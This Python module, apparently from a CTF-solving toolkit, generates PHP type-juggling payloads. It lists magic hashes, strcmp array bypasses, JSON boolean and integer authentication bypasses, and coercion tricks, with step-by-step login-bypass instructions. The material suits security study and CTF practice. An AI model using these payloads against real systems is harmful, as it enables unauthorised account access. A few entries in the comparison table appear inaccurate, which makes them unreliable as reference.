"""PHP type-juggling probe (split from misc_probe_tools.py)."""

from typing import List, Tuple

from ctf_solver.tools.core import parse_json_input


class PhpTypeJugglingTool:
    """
    PhpTypeJugglingTool: generate PHP type juggling payloads and reference data.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "magic_hashes",
          "hash_type": "md5",
          "target_value": "0"
        }

    Supported operations:
      - magic_hashes: Known values whose hash starts with 0e (scientific notation trick)
      - strcmp_bypass: Payloads to bypass strcmp() checks
      - loose_comparison: PHP loose comparison table and gotchas
      - type_coercion: Payloads for intval(), is_numeric(), in_array() bypass
    """

    name: str = "php_type_juggling"
    description: str = (
        "Generate PHP type juggling attack payloads and reference data. Input must be "
        "JSON with 'operation' (magic_hashes, strcmp_bypass, loose_comparison, or "
        "type_coercion). For magic_hashes, optionally provide 'hash_type' (md5/sha1/sha256, "
        "default md5). Returns known magic hash values, bypass payloads, comparison "
        "tables, and exploitation guidance for PHP loose type comparison vulnerabilities."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "operation": {
                "type": "string",
                "enum": [
                    "magic_hashes",
                    "strcmp_bypass",
                    "loose_comparison",
                    "type_coercion",
                ],
            },
            "hash_type": {
                "type": "string",
                "enum": ["md5", "sha1", "sha256"],
                "default": "md5",
            },
            "target_value": {"type": "string"},
        },
        "required": ["operation"],
        "additionalProperties": False,
    }
    samples = [
        {"operation": "magic_hashes", "hash_type": "md5"},
        {"operation": "strcmp_bypass"},
    ]

    VALID_OPERATIONS = (
        "magic_hashes",
        "strcmp_bypass",
        "loose_comparison",
        "type_coercion",
    )

    # Magic hashes: values whose hash starts with 0e followed by only digits
    MAGIC_HASHES_MD5: List[Tuple[str, str]] = [
        ("240610708", "0e462097431906509019562988736854"),
        ("QNKCDZO", "0e830400451993494058024219903391"),
        ("aabg7XSs", "0e087386482136013740957780965295"),
        ("aabC9RqS", "0e041022518165728065344349536617"),
        ("s878926199a", "0e545993274517709034328855841020"),
        ("s155964671a", "0e342768416822451524974117254469"),
        ("s214587387a", "0e848240448830537924465865611904"),
        ("0e215962017", "0e291242476940776845150308577824"),
    ]

    MAGIC_HASHES_SHA1: List[Tuple[str, str]] = [
        ("aaroZmOk", "0e00000000000000000000000000000000000000"),
        ("aaK1STfY", "0e76658526655756207688271159624026011393"),
        ("aaO8zKZF", "0e57855384913097576052441895780700925679"),
        ("10932435112", "0e07766915004133176347055865026311692244"),
    ]

    def __init__(self) -> None:
        pass

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "PhpTypeJugglingTool")
        if err:
            return err
        operation = data.get("operation", "").strip().lower()
        if not operation:
            return (
                "[PhpTypeJugglingTool] Error: 'operation' is required. "
                "Must be one of: magic_hashes, strcmp_bypass, loose_comparison, type_coercion."
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[PhpTypeJugglingTool] Error: Invalid operation '{operation}'. "
                f"Must be one of: {', '.join(self.VALID_OPERATIONS)}."
            )

        if operation == "magic_hashes":
            return self._magic_hashes(data)
        elif operation == "strcmp_bypass":
            return self._strcmp_bypass(data)
        elif operation == "loose_comparison":
            return self._loose_comparison(data)
        elif operation == "type_coercion":
            return self._type_coercion(data)

        return "[PhpTypeJugglingTool] Error: Unexpected state."

    def _magic_hashes(self, data: dict) -> str:
        """Return known magic hash values."""
        hash_type = data.get("hash_type", "md5").strip().lower()
        target_value = data.get("target_value", "0")

        lines = [
            "[PhpTypeJugglingTool] Magic Hash Values",
            "=" * 55,
            "",
            "PHP loose comparison (==) treats strings starting with '0e'",
            "followed by only digits as scientific notation (0 * 10^N = 0).",
            f"So any 0e-hash == {target_value!r} evaluates to TRUE with ==.",
            "",
        ]

        if hash_type in ("md5", "all"):
            lines.append("=== MD5 Magic Hashes ===")
            lines.append(f"{'Value':<20} {'MD5 Hash'}")
            lines.append("-" * 55)
            for value, md5_hash in self.MAGIC_HASHES_MD5:
                lines.append(f"{value:<20} {md5_hash}")
            lines.append("")

        if hash_type in ("sha1", "all"):
            lines.append("=== SHA1 Magic Hashes ===")
            lines.append(f"{'Value':<20} {'SHA1 Hash'}")
            lines.append("-" * 55)
            for value, sha1_hash in self.MAGIC_HASHES_SHA1:
                lines.append(f"{value:<20} {sha1_hash}")
            lines.append("")

        if hash_type == "sha256":
            lines.append("=== SHA256 Magic Hashes ===")
            lines.append("No practical 0e magic hashes are known for SHA256.")
            lines.append("The probability of finding one is extremely low due to")
            lines.append(
                "the 64-character hash length requiring all digits after '0e'."
            )
            lines.append("")

        if hash_type not in ("md5", "sha1", "sha256", "all"):
            lines.append(
                f"Unknown hash type '{hash_type}'. Supported: md5, sha1, sha256, all."
            )
            lines.append("")

        lines.append("=== Usage ===")
        lines.append(
            "If the server does: if (md5($input) == '0') or if (md5($a) == md5($b))"
        )
        lines.append("Send any magic hash value as input to bypass the check.")
        lines.append("")
        lines.append("Example: password=240610708 bypasses md5($password) == '0'")
        lines.append("Example: Both 240610708 and QNKCDZO have 0e hashes, so")
        lines.append("         md5('240610708') == md5('QNKCDZO') is TRUE in PHP.")

        return "\n".join(lines)

    def _strcmp_bypass(self, data: dict) -> str:
        """Generate payloads to bypass strcmp()."""
        lines = [
            "[PhpTypeJugglingTool] strcmp() Bypass Payloads",
            "=" * 55,
            "",
            "PHP strcmp() returns NULL when comparing a string with an array.",
            "In loose comparison: NULL == 0 is TRUE, so strcmp() == 0 passes.",
            "Note: This works in PHP < 8.0. PHP 8.0+ throws a TypeError.",
            "",
            "=== URL-encoded Payloads (GET/POST) ===",
            "",
            "  password[]=                     # sends array instead of string",
            "  password[]=anything             # array with value",
            "  password[0]=                    # explicit index",
            "",
            "=== JSON Payloads ===",
            "",
            '  {"password": []}               # empty array',
            '  {"password": [""]}             # array with empty string',
            '  {"password": true}             # boolean true',
            '  {"password": 0}                # integer zero',
            "",
            "=== Raw POST Body ===",
            "",
            "  password[]=&username=admin      # form-encoded array",
            "",
            "=== Exploitation Steps ===",
            "",
            "1. Identify a login form or API that uses strcmp() for password check",
            "2. Change the password parameter from a string to an array:",
            "   - Change password=test to password[]=",
            "3. If the server uses JSON, send an array or non-string type",
            "4. If using PHP < 8.0, strcmp(array, string) returns NULL",
            "5. NULL == 0 is TRUE in loose comparison, bypassing the check",
            "",
            "=== PHP Version Notes ===",
            "",
            "  PHP 5.x-7.x: strcmp([], 'secret') returns NULL; NULL == 0 is TRUE",
            "  PHP 8.0+:    strcmp([], 'secret') throws TypeError (not exploitable)",
        ]

        return "\n".join(lines)

    def _loose_comparison(self, data: dict) -> str:
        """Show PHP loose comparison table and gotchas."""
        lines = [
            "[PhpTypeJugglingTool] PHP Loose Comparison (==) Gotchas",
            "=" * 55,
            "",
            "PHP loose comparison (==) performs type juggling before comparison.",
            "This leads to many unexpected TRUE results that can be exploited.",
            "",
            "=== Key Loose Comparisons ===",
            "",
            '  "0" == false        => TRUE',
            '  "" == false         => TRUE',
            '  "" == 0             => TRUE  (PHP 7), FALSE (PHP 8)',
            '  "0" == null         => FALSE (PHP 8), TRUE (PHP 7)',
            '  "php" == 0          => TRUE  (PHP 7), FALSE (PHP 8)',
            '  "1" == "01"         => TRUE',
            '  "10" == "1e1"       => TRUE  (scientific notation)',
            '  "100" == "1E2"      => TRUE  (scientific notation)',
            '  "0e123" == "0e456"  => TRUE  (both are 0 in scientific notation)',
            '  "0" == "0e999"      => TRUE  (0 == 0)',
            "  null == false       => TRUE",
            '  "" == null          => TRUE',
            '  0 == "any_string"   => TRUE  (PHP 7), FALSE (PHP 8)',
            '  true == "any_string" => TRUE (non-empty string)',
            "  true == 1           => TRUE",
            "  true == -1          => TRUE",
            "",
            "=== Authentication Bypass Techniques ===",
            "",
            "1. Magic hashes: If server checks md5(input) == '0' or md5(a) == md5(b)",
            "   Send a value whose MD5 starts with 0e (e.g., 240610708)",
            "",
            "2. Boolean bypass: If server checks password == stored_hash",
            '   Send true (in JSON: {"password": true}) since true == "any_string"',
            "",
            "3. Integer bypass: If server checks password == '0'",
            "   Send 0 (integer) since 0 == '0' is TRUE",
            "",
            "4. Scientific notation: If comparing numeric strings",
            '   "1e1" == "10" and "0e1" == "0" both evaluate TRUE',
            "",
            "=== Strict vs Loose ===",
            "",
            "  ==  (loose):  type juggling, many unexpected TRUE values",
            "  === (strict): no type juggling, compares type AND value",
            "",
            "  Always check if the target uses == or ===.",
            "  Loose comparison is far more exploitable.",
        ]

        return "\n".join(lines)

    def _type_coercion(self, data: dict) -> str:
        """Generate payloads for intval(), is_numeric(), in_array() bypass."""
        lines = [
            "[PhpTypeJugglingTool] Type Coercion Bypass Payloads",
            "=" * 55,
            "",
            "=== intval() Bypass ===",
            "",
            "intval() converts strings to integers, stopping at first non-digit.",
            "",
            '  intval("0x1A") = 0           # PHP 7 (hex not parsed)',
            '  intval("0x1A", 16) = 26      # explicit base 16',
            '  intval("123abc") = 123       # stops at "a"',
            '  intval("0123") = 123         # leading zero stripped (decimal)',
            '  intval("1e2") = 1            # PHP 7 (not scientific)',
            '  intval("1e2") = 100          # PHP 8 (scientific parsed)',
            "",
            "  Bypass: if intval($input) == 0 is the check,",
            '    send "0abc" (intval returns 0) but string comparison passes',
            "",
            "=== is_numeric() Bypass ===",
            "",
            "is_numeric() returns true for numeric strings including hex (PHP 5) and",
            "scientific notation.",
            "",
            '  is_numeric("0x539") = true    # PHP 5 only (hex string)',
            '  is_numeric("0x539") = false   # PHP 7+ (hex not numeric)',
            '  is_numeric("1e2") = true      # scientific notation',
            '  is_numeric("0123") = true     # octal-looking but decimal',
            '  is_numeric(" 123") = true     # leading whitespace OK',
            '  is_numeric("123\\n") = true   # trailing whitespace OK',
            "",
            "  Bypass: Send scientific notation or whitespace-padded numbers",
            "  to pass is_numeric() but get different intval() results",
            "",
            "=== in_array() Bypass (Loose Comparison) ===",
            "",
            "By default, in_array() uses loose comparison (no strict flag).",
            "",
            '  in_array("1abc", [0, 1, 2]) = true    # "1abc" == 1 (PHP 7)',
            '  in_array("0abc", [0, 1, 2]) = true    # "0abc" == 0 (PHP 7)',
            '  in_array(true, ["a", "b"]) = true      # true == "a"',
            '  in_array(0, ["a", "b"]) = true         # 0 == "a" (PHP 7)',
            "",
            "  Bypass: if checking user role against allowed list,",
            "  send 0 or true to match any string in the array",
            "",
            "=== json_decode() Type Confusion ===",
            "",
            "When a PHP application uses json_decode() and compares with ==:",
            "",
            '  JSON integer 0 vs PHP string "password": 0 == "password" is TRUE (PHP 7)',
            '  JSON true vs PHP string "anything": true == "anything" is TRUE',
            '  JSON string "0" vs PHP integer 0: "0" == 0 is TRUE',
            "",
            "  Bypass: Send JSON with integer/boolean types instead of strings",
            '  Example: {"password": 0} or {"password": true}',
            "",
            "=== PHP Version Impact ===",
            "",
            "  PHP 7.x: Many type juggling attacks work (string-to-int coercion)",
            "  PHP 8.0+: \"0 == 'string'\" now returns FALSE (breaking change)",
            "  PHP 8.0+: strcmp() with non-strings throws TypeError",
            "  PHP 8.1+: More strict type handling in built-in functions",
        ]

        return "\n".join(lines)
